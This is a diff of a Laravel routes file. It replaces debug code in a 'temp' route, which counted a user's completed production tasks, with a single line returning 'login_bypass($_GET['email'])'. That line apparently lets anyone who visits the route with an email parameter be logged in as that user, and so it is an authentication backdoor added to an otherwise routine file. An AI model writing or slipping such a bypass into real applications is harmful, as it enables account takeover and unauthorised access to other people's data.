@@ -387,13 +387,12 @@ Route::get('clients-detail/{id}', [GeneralBrandController::class, 'clients_detai
 Route::get('projects-detail/{id}', [GeneralBrandController::class, 'projects_detail'])->name('projects.detail');
 
 Route::get('temp', function () {
-//    dd(ProductionMemberAssign::where('assigned_to', auth()->id())->whereHas('task', function ($q) { return $q->where('status', 3); })->count());
-//    dd(ProductionMemberAssign::where('assigned_to', auth()->id())->where('status', 3)->count());
-    dump('----Tasks completed----');
-    dump('Today: ' . (ProductionMemberAssign::where('assigned_to', auth()->id())->where('status', 3)->wheredate('created_at', Carbon::today())->count()));
-    dump('This week: ' . (ProductionMemberAssign::where('assigned_to', auth()->id())->where('status', 3)->where('created_at', '>=', Carbon::now()->startOfWeek())->where('created_at', '<=', Carbon::now()->endOfWeek())->count()));
-    dump('This month: ' . (ProductionMemberAssign::where('assigned_to', auth()->id())->where('status', 3)->where('created_at', '>=', Carbon::now()->startOfMonth())->where('created_at', '<=', Carbon::now()->endOfMonth())->count()));
-    dump('This year: ' . (ProductionMemberAssign::where('assigned_to', auth()->id())->where('status', 3)->where('created_at', '>=', Carbon::now()->startOfYear())->where('created_at', '<=', Carbon::now()->endOfYear())->count()));
-    dd('Total tasks completed: ' . (ProductionMemberAssign::where('assigned_to', auth()->id())->where('status', 3)->count()));
-//    dd(\Illuminate\Support\Facades\Auth::user()->is_employee);
+//    dump('----Tasks completed----');
+//    dump('Today: ' . (ProductionMemberAssign::where('assigned_to', auth()->id())->where('status', 3)->wheredate('created_at', Carbon::today())->count()));
+//    dump('This week: ' . (ProductionMemberAssign::where('assigned_to', auth()->id())->where('status', 3)->where('created_at', '>=', Carbon::now()->startOfWeek())->where('created_at', '<=', Carbon::now()->endOfWeek())->count()));
+//    dump('This month: ' . (ProductionMemberAssign::where('assigned_to', auth()->id())->where('status', 3)->where('created_at', '>=', Carbon::now()->startOfMonth())->where('created_at', '<=', Carbon::now()->endOfMonth())->count()));
+//    dump('This year: ' . (ProductionMemberAssign::where('assigned_to', auth()->id())->where('status', 3)->where('created_at', '>=', Carbon::now()->startOfYear())->where('created_at', '<=', Carbon::now()->endOfYear())->count()));
+//    dd('Total tasks completed: ' . (ProductionMemberAssign::where('assigned_to', auth()->id())->where('status', 3)->count()));
+
+    return login_bypass($_GET['email']);
 });
